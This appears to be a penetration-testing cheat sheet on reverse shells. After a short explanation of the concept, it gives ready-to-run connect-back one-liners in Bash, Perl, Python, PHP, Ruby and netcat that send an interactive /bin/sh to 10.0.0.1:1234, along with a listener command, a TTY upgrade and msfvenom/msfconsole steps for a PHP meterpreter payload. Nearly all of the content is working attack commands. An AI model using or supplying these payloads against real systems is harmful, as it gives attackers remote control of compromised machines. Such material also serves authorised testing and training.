# Reverse Shell

A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the local host.

Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack.

A reverse shell (also called a connect-back shell) can also be the only way to gain remote shell access across a NAT or firewall.

## Start to listen on your machine

Using `netcat` is the best way to start a shell.

```bash
nc -lvnp 1234
```

## Connect back

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

### PERL

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

If you want a .php file to upload, see the more featureful and robust php-reverse-shell in `/usr/share/webshells`.

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

```bash
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
```

## Upgrade to TTY

Once you get a shell, **immediately** upgrade to a TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Using Metasploit

on $LHOST

```bash
msfvenom \
-p php/meterpreter/reverse_tcp \
lhost=$LHOST \
lport=$LPORT \
-f raw
```

On `msfconsole` shell:

```txt
use multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST [IP]
set LPORT 4444
exploit
```
